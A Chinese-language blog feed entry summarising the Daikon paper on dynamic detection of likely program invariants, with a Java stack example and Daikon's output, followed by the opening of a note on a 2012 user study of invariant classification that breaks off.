        <content type="html"><![CDATA[<h2 id="1-the-daikon-system-for-dynamic-detection-of-likely-invariants" tabindex="-1">1 The Daikon system for dynamic detection of likely invariants</h2><ul><li>引用：Ernst M D, Perkins J H, Guo P J, et al. The Daikon system for dynamic detection of likely invariants[J]. Science of computer programming, 2007, 69(1-3): 35-45.</li></ul><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>Daikon是一个动态检测不变量的工具</li><li>不变量是在程序的某个点或点上保持的属性；这些通常用于assert语句、文档和形式规范。例如包括常数（x = a）、非零（x ≠ 0）、处于范围内（a ≤ x ≤ b）、线性关系（y = ax + b）、排序（x ≤ y）、来自库的函数（x = fn(y)）、包含（x ∈ y）、排序（x 已排序）等。用户可以扩展Daikon以检查其他不变量。</li><li>动态不变量检测运行程序，观察程序计算的值，然后报告在观察到的执行中为真的属性。动态不变量检测是一种可以应用于任意数据的机器学习技术。Daikon可以检测C、C++、Java和Perl程序中的不变量，以及记录结构化数据源；很容易将Daikon扩展到其他应用程序中</li><li>不变量在程序理解和一系列其他应用中非常有用，Daikon的输出已经被用于生成测试用例，预测组建集成中的不完备出，自动化定理证明，修复不一致数据，检查数据流的有效性等</li><li>Daikon完全开源，有广泛的文档 <a href="http://pag.csail.mit.edu/daikon/">网址</a></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>本文介绍Daikon：一个功能齐全，稳健的不变量检测工具</li><li>不变量可以阐释数据结构和算法，对手动和自动的变成人物，从设计到维护都是有用的，例如<ul><li>它们识别了在修改代码时必须保留的程序属性 （<strong>这里和debloating的联系？</strong>）</li></ul></li><li>尽管不变量有很多有点，但他们通常在程序中缺失。期望程序员完全使用不变量对代码进行注释的另一种选择是从程序执行中自动推断可能的不变量。对于某些重要的人物，动态推断的属性比人工编写的规范更可取</li><li>Diakon的输出是一组由执行跟踪在统计上证明的可能的的不变量。其结果可以用作文档，添加到程序源码作为断言，或用作其它工具的输入（见Section 4）</li></ul><h3 id="2-example" tabindex="-1">2 example</h3><ul><li>考虑一个名为<code>StackAr</code>的Java类，实习了一个具有固定大小的栈，其实现如下</li></ul><pre><code class="language-java">Object[] theArray; // Array that contains the stack elements.int topOfStack; // Index of top element. -1 if stack is empty.// 实现方法void push(Object x) // Insert xvoid pop() // Remove most recently inserted itemObject top() // Return most recently inserted itemObject topAndPop() // Remove and return most recently inserted itemboolean isEmpty() // Return true if empty; else falseboolean isFull() // Return true if full; else falsevoid makeEmpty() // Remove all items</code></pre><ul><li>使用<code>StackTester</code>类对该类进行测试，如</li></ul><pre><code class="language-bash">java DataStructures.StackArTester</code></pre><ul><li>随后使用Daikon在java的前端产生运行轨迹</li></ul><pre><code class="language-bash">java daikon.Chicory --daikon DataStructures.StackArTester</code></pre><ul><li>Daikon的输出包括过程的前置条件，后置条件，包括对象不变量，这些条件在每个公共方法的入口和出口出均成立。 下面为输出的部分内容，包括对象不变量和构造函数以及<code>ifFull</code>的方法的过程不变量</li></ul><pre><code class="language-java">    /* Object invariants for StackAr*/this.theArray != null  //在构造函数后，theArray不为null，可以安全地使用this.theArray.getClass() == java.lang.Object[].class // theArray的运行时类型是Object[]，ava允许运行时类型是声明类型的子类，但在StackAr中从未发生过这种情况。this.topOfStack &gt;= -1this.topOfStack &lt;= this.theArray.length - 1 // topOfStack的值在数组的范围内this.theArray[0..this.topOfStack] elements != null //所有的栈元素都不为null，这是因为测试套件的结果，而不是StackAr的实现，这是有意义的，指出了测试套件的不足this.theArray[this.topOfStack+1..] elements == null // 不在栈中的元素都是null，我们可以推断pop后的元素会置为null，方便垃圾回收    /* Pre-conditions for the StackAr constructor*/capacity &gt;= 0 // 在构造函数前，为使用负容量创建StackAr    /* Post-conditions for the StackAr constructor*/orig(capacity) == this.theArray.length //包含栈的数组的大小等于指定的容量。this.topOfStack == -1 // 初始化后，栈为空this.theArray[] elements == null// 初始化后，数组中的所有元素都是null    /* Post-conditions for the isFull method*/this.theArray == orig(this.theArray) //数组的引用没有被修改，仍然与方法调用前相同。this.theArray[] == orig(this.theArray[])//数组的内容没有被修改，仍然与方法调用前相同。this.topOfStack == orig(this.topOfStack)//索引没有被修改，仍然与方法调用前相同。(return == false) &lt;==&gt; (this.topOfStack &lt; this.theArray.length - 1)(return == true) &lt;==&gt; (this.topOfStack == this.theArray.length - 1)// 返回值成立的条件</code></pre><h3 id="3-daikon%E7%9A%84%E5%85%B3%E9%94%AE%E7%89%B9%E5%BE%81" tabindex="-1">3 Daikon的关键特征</h3><h4 id="3.1-%E8%AE%B8%E5%A4%9A%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E5%85%B6%E5%AE%83%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BE%93%E5%85%A5" tabindex="-1">3.1 许多编程语言和其它数据格式的输入</h4><ul><li>Daikon可以处理C、C++、Java和Perl程序计算可能的不变量（见5.1）</li><li>Daikon还可以处理来自电子表格（如Excel）的数据，使用CSV（逗号分隔值）格式</li><li>当在非由程序生成的数据上运行Daikon是很方便的</li><li>Daikon支持新的编程语言和数据格式，已经有几个用户这样做了（见第5.3节）。</li></ul><h4 id="3.2-%E4%B8%B0%E5%AF%8C%E7%9A%84%E8%BE%93%E5%87%BA" tabindex="-1">3.2 丰富的输出</h4><ul><li><p>Daikon的主要目标是报告具有表现力和有用的输出。报告的不变量取决于不变量检测器表达的不变量语法，检测的变量，以及检测不变量的程序点。接下来讨论每个因素</p></li><li><p><strong>Grammar of properties 属性语法</strong>：Daikon检查75中不同的不变量，包括摘要中的，同时用户可以轻松的扩展。检查大量的不变量可以增添人工或工具使用不变量的可能性，同时也增加了不变量检查的世界爱你。Daikon进行了性能优化以支持大量的不变量</p></li><li><p>Daikon还包括条件不变量或蕴含式，如 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>f</mi><mi>t</mi><mo mathvariant="normal">≠</mo><mi>n</mi><mi>u</mi><mi>l</mi><mi>l</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>f</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>≤</mo><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">this.left \neq null \implies this.left.value \leq this.value</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">hi</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7184em;vertical-align:-0.024em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">ll</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">hi</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">hi</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span></span></span></span></eq>. Daikon具有某些内置谓词，用于查找蕴含式；例如，哪个return语句在过程中被执行以及布尔过程是否返回true和false。此外，Daikon可以从文件中读取谓词，并根据这些谓词查找蕴涵关系[1]。这些谓词可以通过手动或使用Daikon配备的工具生成，例如通过对程序的静态分析或对执行跟踪的值进行集群分析</p></li><li><p><strong>Grammer of variables</strong>：不变量检测器可以表达的不变量必须被实例化为特定的值或其它值。例如 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x\in y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> 是在两个变量上实例化的，那么第二个必须是集合，Daikon可以处理以下类型不变量</p><ul><li>过程参数和返回值</li><li>前状态值（用orig表示），这运行报告过程副作用和输入输出关系</li><li>全局变量</li><li>字段（给定对象a，有用的附加信息出现在a.f,a.g等中）</li><li>对没有副作用的（pure，observer）的方法，如size()</li><li>衍生变量（共25个），如给定数组a和整数lasti，则对a[lasti]的不变量可能是感兴趣的，即使它不是一个变量，甚至可能不会出现在程序中<ul><li>这些变量类型可以组合使用，例如 a.b[myObject.getX()]。</li><li>Daikon可以控制是否仅考虑公共字段/方法（提供数据结构的外部，客户端试图），或者包括四有字段，方法（提供数据结构内部，实现试图）</li><li>另一个开关控制检查字段和纯方法的调用深度</li></ul></li></ul></li><li><p><strong>程序点</strong>：Daikon在程序的入口和出口检查不变量，从而产生与前置条件和后值条件相对应的可能不变量。</p><ul><li>它在每个过程出口处（即返回语句），和通过个别出口进行概括从而聚合出口处（由客户端视角查看）处计算不变量</li><li>可能的对象或类不变量也在聚合程序点（对象点）处计算，对象点概括了在类的公共方法的入口和出口出观察到的所有对象，在传递到其他类的方法中或从其他类的方法返回的对象，或者存储在对象字段中的对象。</li></ul></li></ul><h4 id="3.3-scalable-%E6%89%A9%E5%B1%95%E6%80%A7" tabindex="-1">3.3 Scalable 扩展性</h4><ul><li>尽管在3.2描述了丰富的输出，Diakon可以扩展到非平凡程序。</li><li>例如，Daikon被用于为 美国宇航局阿姆斯研究中心开发的Center-TRACON自动化系统（CTAS）生成部分一致性规范（见第4.6节）[2]。CTAS是一套超过100万行C和C++代码的空中交通管制工具。</li><li>将Daikon应用到大型程序上，往往需要将其集中在程序的子集上，后减少Daikon考虑的派生变量甚至不变量的数量。所有这些可以通过命令行完成</li></ul><h4 id="3.4-%E4%B8%8D%E5%8F%98%E9%87%8F%E7%AD%9B%E9%80%89" tabindex="-1">3.4 不变量筛选</h4><ul><li>动态不变量检测技术针对观察到的运行时值测试不变性。 与任何动态分析或机器学习技术一样，存在过拟合（泛化过度）的可能性，即在训练中运行为真但在一般情况下不为真的属性。<ul><li>例如，如果对特定变量的观察次数不够，那么观察到的模式可能只是巧合。</li><li>Diakon通过计算零假设测试（一个属性在随机输入中的概率），然后仅在其概率小于用户定义的置信参数时报告该属性，来缓解这个问题。</li></ul></li><li><strong>Redundant invarints</strong>:可以被其它不变量逻辑推出的不变量可以从输出中删除，而不会丢失信息。Daikon尽可能的不计算冗余不变量，这样可以提高性能（见5.2）。 某些优化无法处理的冗余项将在通过post-processing阶段删除。</li><li><strong>Abstract types</strong>：程序中的许多变量之间没有关系。例如。变量temp可能为当前温度，而time为自1970年以来的秒数，尽管存在 temp&lt; time 这个不变量，但这并没有什么意义。Daikon可以使用抽象类型信息[3]将不变量限制为相关变量，Daikon包里包括了计算抽象类型的工具</li></ul><h4 id="3.5-%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F" tabindex="-1">3.5 输出格式</h4><ul><li>Daikon支持多种输出格式，也可以添加新的格式(见5.3)<ul><li>Daikon：默认格式，带有两次和其它功能</li><li>DBC。为Parasoft的Jtest工具设计的契约格式[4]。</li><li>ESC。用于ESC/Java工具的扩展静态检查器格式[5]。</li><li>IOA。用于建模输入/输出自动机的IOA语言，也可以转换为Isabelle定理证明器的语言。</li><li>Java。可在Java程序中使用的Java表达式，例如作为断言。</li><li>JML。Java建模语言[6]格式，被许多工具[7]使用。</li><li>Repair。自动数据结构修复工具[2]使用的格式。</li><li>Simplify。Simplify自动定理证明器的格式[8]。</li></ul></li><li>Daikon附带的annotate工具将可能的不变性插入源代码作为注释。</li></ul><h4 id="3.6-%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7" tabindex="-1">3.6 可移植性</h4><ul><li>Daikon可以在各种平台上轻松移植<ul><li>Daikon的推理引擎和Java工具由Java编写</li><li>Perl工具是用Perl编写的，这两种语言非常易于移植。</li><li>一个C工具限定Linux/x86平台，另一个可以在任何可用Purify的平台上移植，包括Windows、Linux和几种商业Unix变体。</li></ul></li></ul><h3 id="4-%E4%BD%BF%E7%94%A8" tabindex="-1">4 使用</h3><ul><li>Daion生成的不变量时程序规范的一种动态特征。</li><li>特征被广泛地认为在程序开发过程中是很有价值的，包括设计，编码，验证，测试，优化和维护。它们还增强了程序员对数据结构，算法，和程序操作的理解。然而在实践中，正式的特征规范很少可用，因为他们写起来费时费力，而且即使可用，也无法捕获程序正确执行所依赖的所有属性。</li><li>动态生成的特征与理想静态特征规范不同。动态规范不仅会揭示有关目标行为的信息，还会揭示关于特定实现和在程序运行环境（输入）下的信息。对于许多任务（如改进测试套间或某些调试任务），动态信息甚至比静态信息更有帮助</li></ul><h4 id="4.1-documentation" tabindex="-1">4.1 Documentation</h4><ul><li>不变量表示程序运行的某些方面，并提供了对程序操作，算法，数据结构的文档化。因此，他们可以帮助程序理解,而对程序理解的程度是与每个变成任务的先决条件。而从运行中自动提取的信息一定是最新的。</li><li>即使对已经用注释，断言语句或规范文档化的代码，自动推断不变量也是有用的。推断出的不变量可以检查或细化程序员提供的不变量；程序自我检查通常是过时的，无效的或不正确的[9]</li></ul><h4 id="4.2-avoid-bugs" tabindex="-1">4.2 avoid bugs</h4><ul><li>不变量可以保护程序员对程序正确行为所依赖的假设进行意外更改产生的影响。如果原始不变量没有被记录，更不用说依赖了，那么程序员就很容易违反它们，从而在程序的远程部分引入错误</li><li>程序维护引入的错误[10,11],其中其多是由违反程序不变量引起的。而当程序员参照Daikon输出，可以尽可能的避免破坏这些不变量[12]</li></ul><h4 id="4.3-debugging" tabindex="-1">4.3 Debugging</h4><ul><li>尽管最好是在第一次就避免错误，不变量也可以帮助调试。<ul><li>Raz等人使用Daikon检查数据流中的一致性输入[13]</li><li>许多作者利用 训练运行和实际运行之间推断的不变量的不一致性作为程序错误的指标，应该引起人们的注意[14-16]</li></ul></li><li>动态检测到的不变量也可以帮助理解或定位错误。<ul><li>Groce使用连续成功和失败的运行之间的差异来简介解释测试失败[17]</li><li>Xie比较内部组件的行为，以定位程序版本之间的差异并格里错误[18]</li><li>Libit提供了一种轻量级的方法来确定哪些属性表明存在错误[19]</li><li>Brun使用正确和错误的程序上的机器学习来预测不同程序中最有可能出现的错误[20]</li></ul></li></ul><h4 id="4.4-testing" tabindex="-1">4.4 Testing</h4><ul><li>动态检测到的不变量可以像测试套件一样揭示程序自身，因为这些属性显示了程序在测试套件上的执行情况。这些信息在测试中是有用的。<ul><li>如果测试套件覆盖了程序的每个语句或路径，但对程序值覆盖不足，则存在缺陷。例如，“x&gt;0”可以表示从未尝试过零和副值，“x&lt;10”表明从未尝试过大值</li><li>此外，这些属性还准确指示了测试套件需要改进的输入。 推断的不变量还可以作为一种覆盖度度量指标，例如用于测试选择和优先级排序；更多的覆盖度量指标会产生更好的测试套件[21,22]。动态检测到的不变量还可以帮助删除无意义的测试（违反前提条件）并推断何时失败（违反后置条件）[23]</li></ul></li></ul><h4 id="4.5-verification" tabindex="-1">4.5 Verification</h4><ul><li>动态不变量检测基于程序执行提出可能的不变量，但由此得到的属性不能保证在所有可能的执行中都为真。静态检查可以验证属性是否始终为真，但为静态检查器选择输入目标并注释程序会变得很困难和繁琐。将两种技术结合起来可以克服每种技术的缺点，动态检测到的不变量可以为程序进行注释或提供静态验证的目标，而静态验证可以确认动态工具提出的属性是否正确。</li><li>我们已经尝试过几种程序验证器，对于Java程序和ESC/Java[5]，Daikon的精度（可以证明的属性的百分比）超过95%，其中不能证明的属性通常是由于证明器的不完备性，其召回率（找到用于程序验证的属性百分比）超过90%[24]。此外，使用Daikon输出的用户在程序验证任务上统计表现更好[25]。对于证明助手工具，约90%的引理和策略是自动生成的[26]，用于三种分布式算法的证明。</li></ul><h4 id="4.6-data-structure-and-control-structure-repair" tabindex="-1">4.6 Data structure and control structure repair</h4><ul><li>损坏的数据结构导致程序执行不正确或不可预测。<ul><li>数据结构修复可以更新损坏的数据结构，使得程序能够继续以可接受的方式执行。然而，这需要用户提供规范</li><li>Daikon的输出使得整个过程可以自动化，同时允许人工审查。相对于手动生成而言，使用Daikon可以使得程序更加健壮，成本更低。</li></ul></li><li>另一个相关用途是在根据环境输入动态选择模式的程序中。<ul><li>来自训练集中的运行动态监测到的不变量可以指示哪些模式与外部条件相关联</li><li>在运行时，偶尔覆盖程序（不一致）的行为，在现实世界中可以将性能提升50%以上[27]。</li></ul></li></ul><h3 id="5-architecture" tabindex="-1">5 Architecture</h3><ul><li>Daikon通过对程序进行插装，跟踪特定变量，随后运行程序推断关于插装变量和程序中未显现的衍生变量的不变量。</li><li>所有的步骤都是完全自动（除过运行程序的要求，例如其输入），所以实际上用户只需要发出一个类似于运行原始程序的命令（见 2）</li></ul><h4 id="5.1-instrumenters%EF%BC%88%E6%8F%92%E6%A1%A9%E5%B7%A5%E5%85%B7%EF%BC%89" tabindex="-1">5.1 Instrumenters（插桩工具）</h4><ul><li>Instrumenters是针对特定语言，现在的Daikon提供了对C/C++，Java和Perl的Instrumenters。<ul><li>其中一些Instrumenters是基于源代码的：其会创建一个新版本的源代码，随后进行编译，连接和运行。</li><li>其它的Instrumenters直接操作可执行文件，其更易使用，但更会基于特定平台</li></ul></li><li>Instrumenters的基本任务是向目标程序添加指令，以便它输出变量的值。这些跟踪信息直接传送到推理引擎，避免了磁盘存储的紧张。或者跟踪信息也可以输出到文件中（见3.2），允许对多次运行进行重复处理或组合处理</li><li>为了获得良好的覆盖率，有时需要对目标程序使用多个输入进行多次运行。在类似C/C++语言中，无法仅通过检查指针或数组索引来确定其是否有效。这种情况下，Instrumenters必须增强目标程序，以确定每个指针是否引用了有效的内存以及每个数组的范围。</li></ul><h4 id="5.2-inference-engine" tabindex="-1">5.2 Inference engine</h4><ul><li><p>推理引擎读取Instrumenters输出的跟踪信息，随后推断可能的不变量。将特定与语言的Instrumenters和推理引擎分开使其具有可移植性，并且还使得Daikon可以轻松扩展到新的语言和数据格式。需要注意的是，虽然Daikon是整个系统的命令，但也可以特指推理引擎</p></li><li><p>其基本思想是使用生成和检查算法来针对跟踪数据测试一组潜在的不变量。Daikon报告那些在经过足够检验而没有被推翻的不变量。与其它动态方法（如性能分析）一样，结果的准确性部分取决于测试用例的质量和完整性。即使是一般的测试套件在实践中也能产生良好的结果[25,24]，并且存在创造好的测试套件来推断不变量的方法[21,28,22]。</p></li><li><p>一种简单的动态不变量检测算法明确地将不变量语法中每个不变量表示出来：它最初假设所有潜在不变量都为真，并针对每个样本的每个不变量进行测试。任何被否定的不变量都会丢弃。在处理结束时报告剩余的不变量。然而这种算法的可扩展性步枪</p></li><li><p>Daikon经过一系列优化使其能够适用于大量不变量和复杂程序，这些优化基于一个事实：简单的算法检查并报告了许多不必要的不变量。许多不变量是冗余的，无需检查，这些优化将需要检查的不变量数量减少了99%</p></li><li><p>有四个主要优化：</p></li><li><p><strong>Equql variables 相等变量</strong>:如果两个或多个变量始终相等，则对于其中一个变量为真的任何不变量也适用于其它。如x=y,则对于任何不变量f，f(x)=f(y)</p></li><li><p><strong>Dynamically constant variables 动态常量变量</strong>：动态常量变量在每个观察样本具有相同的值。不变量x=a（a为常量）使得对x的任何其它不变量都是多余的。如x=5，则odd(x),x&gt;=5。对于变量组合也是如此：x=5,y=6,则x&lt;y,x=y-1</p></li><li><p><strong>Variable Hierarchy 变量的层次结构</strong>某些变量值会对多个程序点的不变量产生影响。例如，在(公共)方法退出时观察到的值不仅影响方法后值条件，还影响对象不变量。对于两个程序点A和B，如果B的样本也出现在A，则A为真的任何不变量在B处也为真，则在B处是多余的</p></li><li><p><strong>Suppression of weaker invariants 抑制较弱的不变量</strong>：如果一个不变量在逻辑上被其它不变量蕴含，则该不变量会被抑制（前三个例子都是该条件的特里）。例如x&gt;y则x&gt;=y,及0&lt;x&lt;y和z=0则x div y = 0</p></li></ul><h4 id="5.3-extensibility" tabindex="-1">5.3 Extensibility</h4><ul><li>Daikon的主要设计目标就是可扩展性，因为动态不变量检测是一个新型活跃的领域，Daikon以以下方式进行扩展</li><li><strong>Instrumenters 插装工具</strong>：对于新语言或其它数据，只需要输出Daikon输入格式的文件即可。例如，已经为电子表格数据，Linux库调用[30],Java PathFinder模型检查器[17]和在线数据源[13]添加了插装工具</li><li><strong>不变量</strong>：Diakon不变量语法中的每个属性都作为Invariant抽象基类的子类实现，进一步的子类将相似不变量分组。这些子类提供了不变量所需的大部分代码。一个新的不变量必须提供基本功能，例如check modified方法，该方法检查一个元组的值是否和不变量一致</li><li><strong>派生变量</strong>：是Daikon视为变量的表达式，见3.2。与不变量一样，类结构使得通过几个方法即可添加新的派生变量</li><li><strong>输出格式</strong>：新的输出格式(见3.5)只需为每个不变量添加一个新的格式方法即可</li><li><strong>抑制</strong>：如5.2所述，如果某个不变量在逻辑上蕴含了其它不变量，则被蕴涵的不变量被抑制。每种不变量都可以指定一组可能的抑制。每个抑制都是一组前提不变量，共同推出一个结论不变量。通过列出勾成抑制的前提不变量，则不变量被抑制</li><li><strong>模块化</strong>：Daion的设计使其易于作为另一个工具的另一部分使用。其入口处都有一个相应的mainHelper方法，可以以编程方式调用，且永远不会调用System.exit。肯呢个的不变量被写入序列化文件，便于编程使用。有超过100个配置选项可以控制Daikon的行为，Daikon为开源的，允许用户进行更改，并向Daikon贡献新的代码</li></ul><h3 id="6-%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B" tabindex="-1">6 开发过程</h3><ul><li>Daikon被设计为一个长期的，功能健全的，健壮的研究工具。尽管学术研究环境充满挑战（例如，许多短期开发人员，每个人都有非常具体的工作重点），但其开发过程的设计确保其设计目的。该过程关键有<ul><li>月度发布：Daikon每个月会发布一个新版本，这确保构建过程是干净的，文档是最新的，其还有一个及时解决问题的激励</li><li>文档：Daikon有广泛的用户和开发者手册，此外还有描述其算法和使用的技术论文，手册的部分内容是从源代码文档自动创建的，以确保正确性</li><li>支持：存在几个由版主管理的邮件列表，用于用户和开发者的交流。大多数问题会在几天内得到恢复。</li><li>回归测试：每晚会对推理引擎和插装工具进行回归测试，并且在提交代码更改之前由开发人员进行测试。由于其CVS历史和回归测试，Daikon在许多论文中被用作测试对象</li></ul></li></ul><h3 id="7-%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E6%AF%94%E8%BE%83" tabindex="-1">7 相关工具比较</h3><ul><li>由Agitar开发的Agitator产评受到了Daikon的启发[31].Agitar执行动态不变量检测，以便向用户通报测试情况，并改进这些测试。结果称之为“观察”，其包括等式x=y,范围-10&lt; x &lt; y,非空 x！=null，等式.equal，以及从用户源代码收集的属性。Agitar获得了《华尔街日报》2005年软件技术创新奖</li><li>DIDUCE工具[14]用于Java程序，检查一个一元不变量，该不变式会指出所有以前见过的值的每一位的值。在每个程序点（字段或数组引用，或过程调用），都会检查该不变量的三个值：变量当前值，上一个值，二者间茶之。随着不变量的弱化（在观察位置发现新值），打印一条信息。用户可以寻找错误运行中或错误发生之前打印不变量的弱化，发现罕见的边界错误。该工具被用于解释几个已知错误，并揭示了两个新错误。</li><li>IODINE工具[32]使用动态分析从硬件设计中提取可能的设计属性，它寻找如状态机协议，请求-确认对，信号之间的互斥这样的属性。IODINE被用来为双核SPARCTM处理器的一个模块寻找动态不变量</li><li>Remote program sampling[19]是一种轻量化的方法,用于评估C程序中的两种属性，并计算满足每种属性的次数。这些属性是概率性检查的：在大多数程序的执行点中，属性检查会被跳过。其它任何实现都可以进行类似的扩展,牺牲在测试套件上的准确性，但提高了性能。结果通过统计分析进行处理，因此可能导致错误。</li><li>Henkel和Diwan [33,34]构建了一个工具，用于发现代数规范，这些规范描述了代码操作序列的含义，如pop(push(x,stack))=stack。该工具从Java类的签名生成许多术语（测试用例），并根据测试结果提出方程式。该工具还提出并测试泛化。</li><li>SPIN模型检查器已经扩展到检查两个变量是否由=、&lt;、&gt;、≤或≥相关联[35]。输出是一个节点上有变量、边缘上带有比较关系的图。</li><li>一些研究人员从程序或系统跟踪中推断出有限状态自动机，表示允许的转换[36-39]。以自动机形式编写的规范与动态不变量检测器生成的基于公式的程序属性相辅相成。</li><li>Perracotta [40]与此类似，只是它寻找响应属性模式的一组扩展，而不是自动机。</li></ul><h3 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h3><ul><li>Daikon是一个功能齐全、可扩展且健壮的动态不变量检测工具。它支持多种编程语言，并且可以很容易地扩展到其他语言和数据源。它生成的可能不变量已经在从重构到测试到数据结构修复等多个上下文中使用过。</li><li>Daikon可以从http://pag.csail.mit.edu/daikon/ 免费下载。该发行版包括源代码和大量文档，而且Daikon的许可证允许无限制使用。</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工分类动态不变量的用户研究</title>
      <link href="/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%BA%BA%E5%B7%A5%E5%88%86%E7%B1%BB%E5%8A%A8%E6%80%81%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6/"/>
      <url>/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%BA%BA%E5%B7%A5%E5%88%86%E7%B1%BB%E5%8A%A8%E6%80%81%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="understanding-user-understanding%3A-determining-correctness-of-generated-program-invariants" tabindex="-1">Understanding user understanding: determining correctness of generated program invariants</h2><ul><li>引用：Staats M, Hong S, Kim M, et al. Understanding user understanding: determining correctness of generated program invariants[C]，Proceedings of the 2012 International Symposium on Software Testing and Analysis. 2012: 188-198.</li><li>等级：CCF A ISSTA</li><li><a href="https://orbilu.uni.lu/bitstream/10993/10975/1/staats-invariant-understanding-issta-2012.pdf">链接</a></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>问题：软件测试涉及两部分，test input 和 test oracle，测试输入有很多自动化方法，而test oracle没有</li><li>最近：出现程序不变量推断的相关研究，可以帮助生成test oracle</li><li>问题：现有不变量推断方法需要人为参与，存在以下两个原因：<ul><li><ol><li>不变量应该是一种规范，但是是从我们需要验证的源代码中产生的</li></ol></li><li><ol start="2"><li>许多现有方法是动态的，只是从有限的运行轨迹中推测出可能的不变量。</li></ol><ul><li>一项研究表明，0-60%的不变量在现实软件中是错误的，平均有10%[26]</li></ul></li><li>因此，自动不变量生成技术产生的不变量不适合做oracle，最后还得人工筛选不变量</li></ul></li><li>综上，当 user classification effectiveness，用户分类不变量的能力（分辨正确不变量的能力）好的时候，自动不变量生成技术才能真正发挥作用。<strong>然而，目前关注很少</strong>。<ul><li>早些工作探讨了用户使用动态不变量生成作为静态验证辅助工具的能力，得出的结论是区分正确和错误的不变量对用户来说是“相对容易的”[23]。遗憾的是，这项研究没有严格考虑用户的有效性，并且它是使用静态分析工具进行的，这些工具并不总是可用的</li></ul></li><li>本论文中展示两项经验性研究的成果，30人参与用户分类有效性的研究。这项工作目标有两个<ul><li><ol><li>确定使用动态不变量生成技术产生的不变量的用户分类有效性</li></ol></li><li><ol 